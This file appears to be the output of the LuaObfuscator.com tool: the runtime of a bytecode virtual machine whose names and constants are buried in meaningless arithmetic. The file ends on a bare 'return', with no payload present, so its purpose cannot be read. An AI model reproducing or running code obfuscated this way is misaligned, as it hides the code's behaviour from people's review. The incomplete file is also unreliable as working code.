--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v86=0;while true do if (v86==0) then v19=v0(v3(v30,1,1));return "";end end else local v87=0;local v88;while true do if (v87==0) then v88=v2(v0(v30,16));if v19 then local v124=v5(v88,v19);v19=nil;return v124;else return v88;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v89=0 -0 ;local v90;while true do if (v89==0) then v90=(v31/(2^(v32-(2 -(1 + 0)))))%((3 -(878 -(282 + 595)))^(((v33-(2 -1)) -(v32-(620 -((2192 -(1523 + 114)) + 64)))) + 1 + 0)) ;return v90-(v90%(932 -(857 + 74))) ;end end else local v91=(570 -((523 -156) + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v91 + v91))>=v91) and 1) or (0 + 0) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (1067 -(68 + 997)) );v18=v18 + (1272 -(226 + 1044)) ;return (v36 * (1114 -858)) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + (5 -2) );v18=v18 + 4 ;return (v40 * (16777333 -(32 + 85))) + (v39 * (66493 -(892 + 65))) + (v38 * (251 + (8 -3))) + v37 ;end local function v24() local v41=350 -(87 + 263) ;local v42;local v43;local v44;local v45;local v46;local v47;while true do if (v41==(181 -(67 + 113))) then v44=1 + 0 ;v45=(v20(v43,2 -1 ,7 + 8 + 5 ) * ((7 -5)^(984 -(802 + (265 -115))))) + v42 ;v41=(1491 -(998 + 488)) -3 ;end if (((441 -(145 + 293)) -(1 + 0))==v41) then v46=v20(v43,14 + 2 + 5 ,1028 -(915 + 82) );v47=((v20(v43,90 -(830 -(201 + 571)) )==(1 + 0)) and  -(1 -(1138 -(116 + 1022)))) or (1188 -(1069 + 118)) ;v41=6 -3 ;end if (v41==(0 -0)) then v42=v23();v43=v23();v41=1 + 0 ;end if (v41==3) then if (v46==(0 -(0 -0))) then if (v45==(0 + 0)) then return v47 * (791 -(368 + 249 + 174)) ;else v46=3 -2 ;v44=18 -(10 + 8) ;end elseif (v46==2047) then return ((v45==(430 -(44 + 386))) and (v47 * ((3 -2)/0))) or (v47 * NaN) ;end return v8(v47,v46-1023 ) * (v44 + (v45/((444 -(416 + (94 -68)))^((585 -420) -113)))) ;end end end local function v25(v48) local v49;if  not v48 then v48=v23();if (v48==(859 -(814 + 45))) then return "";end end v49=v3(v16,v18,(v18 + v48) -(2 -1) );v18=v18 + v48 ;local v50={};for v66=1 + 0 , #v49 do v50[v66]=v2(v1(v3(v49,v66,v66)));end return v6(v50);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v51=(function() return function(v92,v93,v94,v95,v96,v97,v98,v99) local v92=(function() return 0;end)();local v93=(function() return;end)();local v95=(function() return;end)();while true do if (v92==0) then local v116=(function() return 396 -(115 + 281) ;end)();local v117=(function() return;end)();while true do if (v116~=0) then else v117=(function() return 0 -0 ;end)();while true do if (0~=v117) then else v93=(function() return v94();end)();v95=(function() return nil;end)();v117=(function() return 1 + 0 ;end)();end if (v117~=1) then else v92=(function() return  #"\\";end)();break;end end break;end end end if (v92== #"\\") then if (v93== #"!") then v95=(function() return v94()~=(0 -0) ;end)();elseif (v93==(7 -5)) then v95=(function() return v96();end)();elseif (v93~= #"xxx") then else v95=(function() return v97();end)();end v98[v99]=(function() return v95;end)();break;end end return v92,v93,v94,v95,v96,v97,v98,v99;end;end)();local v52=(function() return function(v100,v101,v102) local v103=(function() return 867 -(550 + 317) ;end)();local v104=(function() return;end)();while true do if (v103~=(0 -0)) then else v104=(function() return 0;end)();while true do if (v104==0) then v100[v101-#"~" ]=(function() return v102();end)();return v100,v101,v102;end end break;end end end;end)();local v53=(function() return {};end)();local v54=(function() return {};end)();local v55=(function() return {};end)();local v56=(function() return {v53,v54,nil,v55};end)();local v57=(function() return v23();end)();local v58=(function() return {};end)();for v68= #"~",v57 do FlatIdent_1743D,Type,v21,Cons,v24,v25,v58,v68=(function() return v51(FlatIdent_1743D,Type,v21,Cons,v24,v25,v58,v68);end)();end v56[ #"asd"]=(function() return v21();end)();for v69= #">",v23() do local v70=(function() return v21();end)();if (v20(v70, #"|", #"~")==(0 -0)) then local v107=(function() return 0;end)();local v108=(function() return;end)();local v109=(function() return;end)();local v110=(function() return;end)();local v111=(function() return;end)();while true do if (0~=v107) then else local v121=(function() return 0;end)();while true do if (v121==(0 -0)) then v108=(function() return 285 -(134 + 151) ;end)();v109=(function() return nil;end)();v121=(function() return 1666 -(970 + 695) ;end)();end if (v121==(1 -0)) then v107=(function() return 1;end)();break;end end end if (v107==2) then while true do if (v108==2) then local v126=(function() return 0;end)();local v127=(function() return;end)();while true do if ((1990 -(582 + 1408))~=v126) then else v127=(function() return 0;end)();while true do if (v127==1) then v108=(function() return  #"-19";end)();break;end if (v127~=0) then else if (v20(v110, #"[", #",")== #"[") then v111[6 -4 ]=(function() return v58[v111[2]];end)();end if (v20(v110,2,2 -0 )== #"{") then v111[ #"xxx"]=(function() return v58[v111[ #"xnx"]];end)();end v127=(function() return 1;end)();end end break;end end end if (v108==0) then local v128=(function() return 0 -0 ;end)();local v129=(function() return;end)();while true do if (v128==0) then v129=(function() return 1824 -(1195 + 629) ;end)();while true do if (v129==(1 -0)) then v108=(function() return  #"}";end)();break;end if (v129~=0) then else v109=(function() return v20(v70,2, #"19(");end)();v110=(function() return v20(v70, #"0836",6);end)();v129=(function() return 242 -(187 + 54) ;end)();end end break;end end end if (v108== #"xxx") then if (v20(v110, #"xnx", #"19(")== #"]") then v111[ #"?id="]=(function() return v58[v111[ #"xnxx"]];end)();end v53[v69]=(function() return v111;end)();break;end if (v108== #"/") then local v131=(function() return 0;end)();local v132=(function() return;end)();while true do if (v131==(780 -(162 + 618))) then v132=(function() return 0 + 0 ;end)();while true do if ((0 + 0)==v132) then v111=(function() return {v22(),v22(),nil,nil};end)();if (v109==0) then local v291=(function() return 0 -0 ;end)();local v292=(function() return;end)();while true do if (v291==0) then v292=(function() return 0 + 0 ;end)();while true do if (v292==(1636 -(1373 + 263))) then v111[ #"-19"]=(function() return v22();end)();v111[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v109== #":") then v111[ #"xxx"]=(function() return v23();end)();elseif (v109==2) then v111[ #"-19"]=(function() return v23() -((1002 -(451 + 549))^(6 + 10)) ;end)();elseif (v109~= #"xxx") then else local v412=(function() return 0 -0 ;end)();local v413=(function() return;end)();while true do if ((0 -0)~=v412) then else v413=(function() return 0;end)();while true do if (v413==(1384 -(746 + 638))) then v111[ #"91("]=(function() return v23() -(2^(7 + 9)) ;end)();v111[ #"0313"]=(function() return v22();end)();break;end end break;end end end v132=(function() return 1 -0 ;end)();end if (v132~=(342 -(218 + 123))) then else v108=(function() return 1583 -(1535 + 46) ;end)();break;end end break;end end end end break;end if (v107==1) then local v122=(function() return 0;end)();local v123=(function() return;end)();while true do if (v122~=(0 + 0)) then else v123=(function() return 0;end)();while true do if (v123==(1 + 0)) then v107=(function() return 562 -(306 + 254) ;end)();break;end if (v123==0) then v110=(function() return nil;end)();v111=(function() return nil;end)();v123=(function() return 1;end)();end end break;end end end end end end for v71= #"]",v23() do v54,v71,v28=(function() return v52(v54,v71,v28);end)();end return v56;end local function v29(v60,v61,v62) local v63=v60[1 + 0 ];local v64=v60[3 -1 ];local v65=v60[(3961 -2491) -(899 + 568) ];return function(...) local v72=v63;local v73=v64;local v74=v65;local v75=v27;local v76=(1801 -(884 + 916)) + (158 -(91 + 67)) ;local v77= -1;local v78={};local v79={...};local v80=v12("#",...) -(604 -(268 + 335)) ;local v81={};local v82={};for v105=290 -(60 + 230) ,v80 do if ((4254>370) and (v105>=v74)) then v78[v105-v74 ]=v79[v105 + (573 -(426 + 146)) ];else v82[v105]=v79[v105 + 1 + 0 ];end end local v83=(v80-v74) + (1457 -(282 + 1174)) ;local v84;local v85;while true do local v106=811 -(569 + 242) ;while true do if ((v106==(0 -0)) or (1635==1777)) then v84=v72[v76];v85=v84[1];v106=1 + 0 ;end if ((v106==(1 + 0)) or (3338>=3993)) then if ((1154<=1475) and (v85<=(1042 -(706 + 318)))) then if (v85<=8) then if (v85<=(1254 -(721 + (1183 -(232 + 421))))) then if ((v85<=1) or (2610<1230)) then if (v85>(1271 -(945 + 326))) then v82[v84[5 -3 ]]=v84[1892 -(1569 + 320) ] + v82[v84[9 -5 ]] ;else local v135=v84[2 + 0 + 0 ];v82[v135]=v82[v135](v13(v82,v135 + (701 -(52 + 219 + 429)) ,v77));end elseif ((v85==2) or (1448==3083)) then local v137=v73[v84[(9 -6) + 0 ]];local v138;local v139={};v138=v10({},{__index=function(v265,v266) local v267=v139[v266];return v267[1501 -(1408 + 92) ][v267[2]];end,__newindex=function(v268,v269,v270) local v271=v139[v269];v271[1087 -(461 + 625) ][v271[1290 -(993 + 295) ]]=v270;end});for v273=1 + 0 ,v84[4] do v76=v76 + ((55 + 1117) -(418 + 753)) ;local v274=v72[v76];if ((3139>916) and (v274[1 + 0 ]==(1 + 2 + 24))) then v139[v273-((524 -(423 + 100)) + (1453 -(666 + 787))) ]={v82,v274[3]};else v139[v273-(1770 -(1749 + 19 + 1)) ]={v61,v274[3]};end v81[ #v81 + (1323 -(1249 + 73)) ]=v139;end v82[v84[2]]=v29(v137,v138,v62);else local v141;v82[v84[(255 -(79 + 175)) + 1 ]]=v82[v84[(1809 -661) -(466 + 679) ]];v76=v76 + (2 -(1 + 0)) ;v84=v72[v76];v82[v84[5 -3 ]]=v84[1903 -((293 -187) + 1400 + 394) ];v76=v76 + 1 + 0 + 0 ;v84=v72[v76];v82[v84[1 + 1 ]]=v84[8 -5 ];v76=v76 + (2 -1) ;v84=v72[v76];v141=v84[116 -((775 -(326 + 445)) + 110) ];v82[v141]=v82[v141](v13(v82,v141 + (585 -((248 -191) + 527)) ,v84[(3185 -1755) -(41 + 1386) ]));v76=v76 + ((242 -138) -(17 + 86)) ;v84=v72[v76];v82[v84[2 + 0 ]][v84[6 -3 ]]=v82[v84[4]];v76=v76 + (2 -1) ;v84=v72[v76];v82[v84[168 -(122 + 44) ]]=v82[v84[5 -2 ]];v76=v76 + (3 -2) ;v84=v72[v76];v82[v84[2 + 0 ]]=v84[1 + 2 ];v76=v76 + (1 -0) ;v84=v72[v76];v82[v84[67 -(30 + 35) ]]=v84[3 + 0 ];v76=v76 + 1 ;v84=v72[v76];v141=v84[(3858 -2599) -(1043 + (411 -197)) ];v82[v141]=v82[v141](v13(v82,v141 + 1 ,v84[(722 -(530 + 181)) -8 ]));v76=v76 + 1 ;v84=v72[v76];v82[v84[1214 -(323 + 889) ]][v84[(888 -(614 + 267)) -4 ]]=v82[v84[584 -(361 + (251 -(19 + 13))) ]];end elseif (v85<=(325 -(53 + 267))) then if (v85==(1 + 3)) then local v162=v84[2];v82[v162]=v82[v162](v13(v82,v162 + (414 -((196 -(92 + 89)) + 398)) ,v84[985 -(18 + 964) ]));else local v164;local v165,v166;local v167;v82[v84[7 -5 ]]=v82[v84[2 + 1 ]];v76=v76 + 1 ;v84=v72[v76];v82[v84[2 + 0 ]]=v61[v84[853 -((32 -12) + 830) ]];v76=v76 + 1 + 0 ;v84=v72[v76];v82[v84[(247 -119) -(60 + 56 + 10) ]]=v61[v84[1 + 2 ]];v76=v76 + (739 -(542 + (456 -260))) ;v84=v72[v76];v82[v84[3 -1 ]]=v61[v84[1 + 2 ]];v76=v76 + 1 + 0 + 0 ;v84=v72[v76];v82[v84[7 -5 ]]=v61[v84[2 + (2 -1) ]];v76=v76 + 1 ;v84=v72[v76];v82[v84[4 -2 ]]=v82[v84[7 -4 ]];v76=v76 + (1552 -(293 + 833 + (747 -322))) ;v84=v72[v76];v82[v84[407 -(17 + 101 + 287) ]]=v82[v84[3]];v76=v76 + ((6 -3) -2) ;v84=v72[v76];v82[v84[1123 -(118 + 1003) ]]=v82[v84[8 -5 ]] + v84[381 -(142 + 235) ] ;v76=v76 + (2 -1) ;v84=v72[v76];v167=v84[9 -7 ];v165,v166=v75(v82[v167](v13(v82,v167 + 1 + 0 ,v84[980 -(553 + 370 + 54) ])));v77=(v166 + v167) -(1 -0) ;v164=0 + (1812 -(1293 + 519)) ;for v276=v167,v77 do v164=v164 + 1 ;v82[v276]=v165[v164];end v76=v76 + 1 + 0 ;v84=v72[v76];v167=v84[2];v82[v167]=v82[v167](v13(v82,v167 + (1 -0) + (0 -0) ,v77));v76=v76 + 1 + 0 + 0 ;v84=v72[v76];v82[v84[2 + 0 ]]=v61[v84[3]];v76=v76 + (2 -1) ;v84=v72[v76];v82[v84[2]]=v61[v84[7 -4 ]];v76=v76 + ((3 -1) -1) ;v84=v72[v76];v82[v84[8 -6 ]]=v82[v84[3]];v76=v76 + (2 -1) + 0 + 0 ;v84=v72[v76];v82[v84[9 -(2 + 5) ]]= #v82[v84[756 -(239 + 514) ]];v76=v76 + (2 -1) + 0 ;v84=v72[v76];v82[v84[1331 -(797 + 532) ]]=v82[v84[4 -1 ]]%v82[v84[1 + 2 + 1 ]] ;v76=v76 + 1 + 0 ;v84=v72[v76];v82[v84[2]]=v84[6 -3 ] + v82[v84[1206 -(373 + 829) ]] ;v76=v76 + (732 -(476 + 255)) ;v84=v72[v76];v82[v84[2]]= #v82[v84[1133 -(369 + 761) ]];v76=v76 + 1 + 0 ;v84=v72[v76];v82[v84[2 -0 ]]=v82[v84[5 -2 ]]%v82[v84[242 -(64 + 174) ]] ;v76=v76 + 1 + 0 ;v84=v72[v76];v82[v84[2]]=v84[3 -0 ] + v82[v84[(1584 -(485 + 759)) -(144 + 192) ]] ;v76=v76 + (217 -(14 + 28 + 174)) ;v84=v72[v76];v82[v84[(4 -2) + 0 ]]=v82[v84[3 + 0 ]] + v84[(1191 -(442 + 747)) + 2 ] ;v76=v76 + (1505 -(363 + 1141)) ;v84=v72[v76];v167=v84[1582 -(1183 + 397) ];v165,v166=v75(v82[v167](v13(v82,v167 + (2 -1) ,v84[3])));v77=(v166 + v167) -(1 + 0) ;v164=0 + 0 ;for v279=v167,v77 do local v280=1975 -(1913 + 62) ;while true do if ((2954==2954) and ((0 + 0)==v280)) then v164=v164 + (1136 -(832 + 303)) ;v82[v279]=v165[v164];break;end end end v76=v76 + ((2 + 0) -1) ;v84=v72[v76];v167=v84[2];v165,v166=v75(v82[v167](v13(v82,v167 + (1934 -(565 + 1368)) ,v77)));v77=(v166 + v167) -1 ;v164=1096 -(709 + 387) ;for v281=v167,v77 do local v282=0;while true do if ((0 -0)==v282) then v164=v164 + (1662 -(1477 + (2042 -(673 + 1185)))) ;v82[v281]=v165[v164];break;end end end v76=v76 + (1 -0) ;v84=v72[v76];v167=v84[2 + 0 ];v82[v167]=v82[v167](v13(v82,v167 + (857 -(564 + 292)) ,v77));v76=v76 + 1 ;v84=v72[v76];v82[v84[2 -0 ]]=v82[v84[8 -5 ]]%v84[308 -((707 -463) + 60) ] ;v76=v76 + 1 + (0 -0) ;v84=v72[v76];v167=v84[478 -(41 + 435) ];v165,v166=v75(v82[v167](v82[v167 + (1002 -(938 + (103 -40))) ]));v77=(v166 + v167) -((947 -(88 + 858)) + 0) ;v164=1125 -(936 + 189) ;for v283=v167,v77 do v164=v164 + 1 + 0 ;v82[v283]=v165[v164];end v76=v76 + 1 ;v84=v72[v76];v167=v84[1615 -(1120 + 445 + 48) ];v82[v167](v13(v82,v167 + 1 + 0 + 0 ,v77));end elseif ((117<=2892) and (v85<=(1144 -(782 + 356)))) then v82[v84[2]]={};elseif ((v85==7) or (453>4662)) then v82[v84[2]]();else local v293=267 -(176 + 91) ;local v294;local v295;local v296;local v297;local v298;while true do if ((1320>595) and (v293==(23 -14))) then v82[v84[2 -0 ]]();v76=v76 + 1 ;v84=v72[v76];v76=v84[(1477 -382) -(975 + 36 + 81) ];break;end if (v293==3) then v84=v72[v76];v82[v84[2]]=v62[v84[(1555 + 323) -(157 + 1718) ]];v76=v76 + 1 ;v84=v72[v76];v293=1 + 3 + 0 ;end if (v293==(0 -0)) then v294=nil;v295,v296=nil;v297=nil;v298=nil;v293=1;end if (v293==(790 -(766 + 23))) then v82[v84[2]]=v82[v84[3]][v84[13 -9 ]];v76=v76 + (1019 -(697 + 321)) ;v84=v72[v76];v82[v84[2]][v82[v84[7 -(19 -15) ]]]=v84[4];v293=3 -1 ;end if (v293==(18 -(3 + 7))) then v298=v84[1 + 1 ];v82[v298]=v82[v298](v13(v82,v298 + (1 -0) ,v77));v76=v76 + ((2 -0) -1) ;v84=v72[v76];v293=1236 -(322 + 905) ;end if (v293==(617 -(602 + 9))) then v84=v72[v76];v298=v84[(2374 -1183) -(449 + (1452 -712)) ];v295,v296=v75(v82[v298](v13(v82,v298 + (873 -(826 + (1926 -(446 + 1434)))) ,v84[950 -(245 + (1985 -(1040 + 243))) ])));v77=(v296 + v298) -(3 -2) ;v293=3 + (11 -7) ;end if (v293==(1902 -(260 + (3485 -(559 + 1288))))) then v298=v84[442 -(382 + (152 -94)) ];v297=v82[v84[1934 -(609 + 1322) ]];v82[v298 + 1 ]=v297;v82[v298]=v297[v84[12 -(27 -19) ]];v293=5 + (1073 -(1036 + 37)) ;end if ((v293==(14 -(5 + 2))) or (3199<590)) then v294=(0 -0) -0 ;for v408=v298,v77 do local v409=1205 -(902 + 303) ;while true do if (v409==(0 -0)) then v294=v294 + (2 -1) ;v82[v408]=v295[v294];break;end end end v76=v76 + 1 + 0 ;v84=v72[v76];v293=1 + 7 ;end if (v293==((2146 -(13 + 441)) -((4188 -3067) + 569))) then v76=v76 + (215 -(22 + (502 -310))) ;v84=v72[v76];v82[v84[685 -(483 + (996 -796)) ]]=v62[v84[(55 + 1411) -(1404 + 59) ]];v76=v76 + (2 -1) ;v293=3;end if (v293==5) then v76=v76 + (1 -0) ;v84=v72[v76];v82[v84[2]]=v84[768 -((1699 -1231) + 297) ];v76=v76 + (563 -(334 + 228)) ;v293=20 -14 ;end end end elseif (v85<=(29 -16)) then if ((v85<=(18 -8)) or (4793<30)) then if (v85>(3 + 6)) then v82[v84[2]]=v82[v84[239 -(141 + 95) ]] + v84[4 + 0 ] ;else local v199=v84[4 -2 ];local v200,v201=v75(v82[v199](v13(v82,v199 + 1 ,v84[6 -3 ])));v77=(v201 + v199) -(1 + 0) ;local v202=0 -(0 + 0) ;for v286=v199,v77 do v202=v202 + 1 + 0 ;v82[v286]=v200[v202];end end elseif (v85<=(6 + 5)) then v82[v84[2 -0 ]][v82[v84[2 + 1 ]]]=v84[167 -(92 + 71) ];elseif ((v85>12) or (1696<=1059)) then local v299=0 + 0 ;local v300;local v301;local v302;while true do if (v299==(1 -(0 + 0))) then v76=v76 + (766 -(574 + 191)) ;v84=v72[v76];v82[v84[2 + 0 ]]=v84[7 -4 ];v76=v76 + 1 ;v299=1482 -(641 + 839) ;end if ((2343==2343) and (v299==(0 + 0))) then v300=nil;v301=nil;v302=nil;v82[v84[851 -(254 + 595) ]]={};v299=(1040 -(910 + 3)) -(55 + 71) ;end if (v299==((14 -9) -1)) then v301=v82[v302];v300=v82[v302 + (1792 -(573 + 1217)) ];if (v300>(0 -0)) then if (v301>v82[v302 + 1 + 0 ]) then v76=v84[4 -(1 + 0) ];else v82[v302 + (942 -(714 + 225)) ]=v301;end elseif ((v301<v82[v302 + (2 -1) ]) or (1043>3591)) then v76=v84[3 -0 ];else v82[v302 + (2 -1) + 2 ]=v301;end break;end if ((v299==((1687 -(1466 + 218)) -0)) or (2890>=4079)) then v82[v84[(1485 -677) -(118 + 688) ]]=v84[(34 + 17) -(25 + 23) ];v76=v76 + 1 + 0 ;v84=v72[v76];v302=v84[1888 -(927 + 959) ];v299=(8 + 5) -9 ;end if (v299==(734 -(16 + 716))) then v84=v72[v76];v82[v84[2]]= #v82[v84[5 -(2 + 0) ]];v76=v76 + 1 ;v84=v72[v76];v299=100 -(11 + 40 + 46) ;end end else v82[v84[4 -2 ]]=v84[288 -(175 + 110) ];end elseif (v85<=(37 -22)) then if (v85>((1217 -(556 + 592)) -55)) then v82[v84[1798 -(503 + 1293) ]][v82[v84[3]]]=v82[v84[11 -7 ]];else local v207=v84[1 + 1 ];local v208=v82[v207];local v209=v82[v207 + 2 + 0 ];if ((4474<=4770) and (v209>(1061 -(810 + 251)))) then if ((v208>v82[v207 + (809 -(329 + 479)) ]) or (4942==3903)) then v76=v84[3];else v82[v207 + (857 -(174 + 680)) + 0 ]=v208;end elseif (v208<v82[v207 + 1 ]) then v76=v84[(3 -2) + 2 ];else v82[v207 + 3 + 0 + 0 ]=v208;end end elseif ((v85<=(549 -(43 + 0 + 490))) or (248>4845)) then v82[v84[3 -1 ]]=v82[v84[736 -(711 + 22) ]]%v82[v84[15 -11 ]] ;elseif (v85>(876 -(240 + 619))) then v82[v84[2 + 0 ]]=v82[v84[1 + 2 ]]%v84[5 -(434 -(153 + 280)) ] ;else v82[v84[2]]=v62[v84[1 + 2 ]];end elseif (v85<=(1771 -((2083 -(396 + 343)) + 400))) then if (v85<=(427 -(255 + 150))) then if ((1569==1569) and (v85<=(16 + 4))) then if (v85==19) then local v211=v84[2 + 0 + 0 ];local v212=v82[v211 + (8 -6) ];local v213=v82[v211] + v212 ;v82[v211]=v213;if ((v212>(0 -0)) or (4927<=3221)) then if (v213<=v82[v211 + (1740 -(404 + 1335)) ]) then v76=v84[409 -(183 + (1700 -(29 + 1448))) ];v82[v211 + 3 ]=v213;end elseif (v213>=v82[v211 + (2 -1) ]) then v76=v84[3];v82[v211 + (3 -0) ]=v213;end else v82[v84[2 + 0 + 0 ]][v84[2 + 1 ]]=v82[v84[(1730 -(135 + 1254)) -(10 + 327) ]];end elseif ((v85>(6 + 9 + 6)) or (1780>2787)) then local v217=v84[(1280 -940) -(118 + 116 + 104) ];do return v13(v82,v217,v77);end else v76=v84[13 -10 ];end elseif (v85<=(8 + 16)) then if ((v85==(16 + 7)) or (3937<=1230)) then local v219=(1976 -(389 + 1138)) -(108 + (915 -(102 + 472))) ;local v220;local v221;local v222;local v223;while true do if ((1 + 0 + 1 + 0)==v219) then for v364=v220,v77 do v223=v223 + (4 -3) ;v82[v364]=v221[v223];end break;end if (v219==(1494 -(711 + 782))) then v77=(v222 + v220) -(1 -0) ;v223=0;v219=471 -(270 + 145 + 54) ;end if (v219==0) then v220=v84[2];v221,v222=v75(v82[v220](v13(v82,v220 + 1 + 0 ,v77)));v219=1820 -(580 + 1239) ;end end else local v224=0 -0 ;local v225;while true do if (v224==(2 -0)) then v76=v76 + 1 + 0 + 0 ;v84=v72[v76];v82[v84[1 + 1 ]]=v82[v84[2 + 1 ]];v76=v76 + 1 ;v84=v72[v76];v82[v84[1 + 1 ]]=v84[7 -(4 + 0) ];v224=2 + (1546 -(320 + 1225)) ;end if (v224==(1171 -(645 + 522))) then v82[v225]=v82[v225](v13(v82,v225 + ((3188 -1397) -(1010 + 780)) ,v84[3 + 0 ]));v76=v76 + ((671 -(89 + 578)) -(2 + 1)) ;v84=v72[v76];v82[v84[5 -(3 + 0) ]][v84[3]]=v82[v84[1840 -(1045 + 791) ]];v76=v76 + ((3 -1) -1) ;v84=v72[v76];v224=5;end if (v224==5) then v82[v84[2 -(1049 -(572 + 477)) ]]=v84[3];break;end if (v224==(506 -(351 + 154))) then v84=v72[v76];v225=v84[(3435 -(821 + 1038)) -(1281 + 293) ];v82[v225]=v82[v225](v13(v82,v225 + (267 -(28 + 238)) ,v84[6 -3 ]));v76=v76 + (1560 -(1381 + (444 -266))) ;v84=v72[v76];v82[v84[1 + 1 + 0 ]][v84[3 + 0 ]]=v82[v84[2 + 2 ]];v224=6 -(3 + 1) ;end if ((v224==(0 + 0)) or (2637<1706)) then v225=nil;v82[v84[2]]=v84[473 -(381 + 89) ];v76=v76 + 1 + 0 ;v84=v72[v76];v82[v84[2 + 0 + 0 ]]=v84[4 -1 ];v76=v76 + (1157 -((1160 -(84 + 2)) + 82)) ;v224=1 + 0 ;end if (v224==3) then v76=v76 + (1 -0) ;v84=v72[v76];v82[v84[1786 -(214 + (2788 -1218)) ]]=v84[1458 -(990 + 465) ];v76=v76 + 1 + 0 ;v84=v72[v76];v225=v84[1 + 0 + 1 ];v224=4 + 0 ;end end end elseif (v85<=(98 -73)) then v82[v84[1728 -(1668 + 58) ]]={};v76=v76 + 1 ;v84=v72[v76];v82[v84[(1034 -406) -(512 + 114) ]]=v62[v84[(1033 -(834 + 192)) -(3 + 1) ]];v76=v76 + (1 -0) ;v84=v72[v76];v82[v84[1 + 1 ]]=v82[v84[10 -7 ]][v84[2 + 2 ]];v76=v76 + 1 + 0 ;v84=v72[v76];v82[v84[2 + 0 ]]=v62[v84[10 -(2 + 5) ]];v76=v76 + (1995 -(109 + 1885)) ;v84=v72[v76];v82[v84[1471 -((2111 -(497 + 345)) + 200) ]]=v82[v84[5 -(1 + 1) ]][v84[819 -(98 + 717) ]];v76=v76 + (827 -(802 + 24)) ;v84=v72[v76];v82[v84[2]]=v62[v84[5 -2 ]];v76=v76 + (1 -(0 + 0)) ;v84=v72[v76];v82[v84[1 + 1 ]]=v82[v84[3 + 0 ]][v84[1 + 3 ]];v76=v76 + 1 + 0 ;v84=v72[v76];v82[v84[5 -3 ]]=v62[v84[9 -6 ]];v76=v76 + 1 + 0 ;v84=v72[v76];if  not v82[v84[1 + 1 + 0 ]] then v76=v76 + 1 + 0 ;else v76=v84[3 + 0 ];end elseif (v85==(13 + (1346 -(605 + 728)))) then if  not v82[v84[1435 -(797 + 636) ]] then v76=v76 + (4 -3) ;else v76=v84[1622 -(1019 + 408 + 192) ];end else v82[v84[1 + 1 ]]=v82[v84[6 -3 ]];end elseif ((v85<=(29 + (6 -3))) or (2669<=2409)) then if ((v85<=(14 + 15)) or (1401>4696)) then if ((v85>28) or (3280<1321)) then local v241=326 -(9 + 183 + 134) ;local v242;while true do if (v241==(1276 -(316 + 960))) then v242=v84[2 + 0 ];v82[v242](v13(v82,v242 + 1 + (0 -0) ,v77));break;end end else v82[v84[2 + 0 ]]=v82[v84[11 -8 ]][v84[4]];v76=v76 + (552 -(83 + 468)) ;v84=v72[v76];v82[v84[1808 -(1202 + 604) ]]=v82[v84[3]][v84[4]];v76=v76 + (4 -3) ;v84=v72[v76];v82[v84[2]][v82[v84[4 -1 ]]]=v82[v84[(3 + 7) -(15 -9) ]];v76=v76 + (326 -(45 + 280)) ;v84=v72[v76];v82[v84[2 + 0 ]]=v62[v84[3 + 0 + 0 ]];v76=v76 + (363 -(112 + 250)) ;v84=v72[v76];v82[v84[1 + 1 ]]=v82[v84[2 + 1 + 0 ]][v84[1 + 3 ]];v76=v76 + (1 -0) ;v84=v72[v76];v82[v84[(5299 -3386) -(340 + 1571) ]][v82[v84[2 + 1 ]]]=v84[1776 -(1733 + 39) ];v76=v76 + ((4 -2) -1) ;v84=v72[v76];v82[v84[1036 -(72 + 53 + 687 + 222) ]]=v84[1951 -(567 + 529 + 852) ];v76=v76 + (490 -(457 + 32)) + 0 ;v84=v72[v76];v76=v84[3 -0 ];end elseif (v85<=(30 + 0)) then local v258=v84[514 -(409 + 103) ];local v259=v82[v84[3]];v82[v258 + (237 -(46 + 190)) ]=v259;v82[v258]=v259[v84[99 -(51 + 44) ]];elseif (v85>(9 + 17 + 5)) then v82[v84[2]]=v82[v84[(561 + 759) -(1114 + 203) ]][v84[730 -(228 + 498) ]];else do return;end end elseif ((4927>=2303) and (v85<=(8 + 26))) then if (v85>33) then v82[v84[2 + 0 ]]= #v82[v84[666 -(174 + 489) ]];elseif (v82[v84[5 -(3 + 0) ]]==v84[1909 -(830 + 1075) ]) then v76=v76 + (525 -(303 + 221)) ;else v76=v84[1272 -((1633 -(832 + 570)) + 1038) ];end elseif (v85<=35) then local v264=v84[(1416 -(1001 + 413)) + 0 + 0 ];do return v82[v264](v13(v82,v264 + ((2593 -1430) -(171 + 991)) ,v84[12 -(3 + 6) ]));end elseif (v85>((339 -243) -60)) then local v314=v84[4 -(1 + 1) ];local v315,v316=v75(v82[v314](v82[v314 + 1 + 0 ]));v77=(v316 + v314) -(3 -(695 -(627 + 66))) ;local v317=(0 -0) -0 ;for v348=v314,v77 do v317=v317 + ((797 -(588 + 208)) -0) ;v82[v348]=v315[v317];end else v82[v84[2]]=v61[v84[9 -6 ]];end v76=v76 + (1249 -(111 + 1137)) ;break;end end end end;end return v29(v28(),{},v17)(...);end return 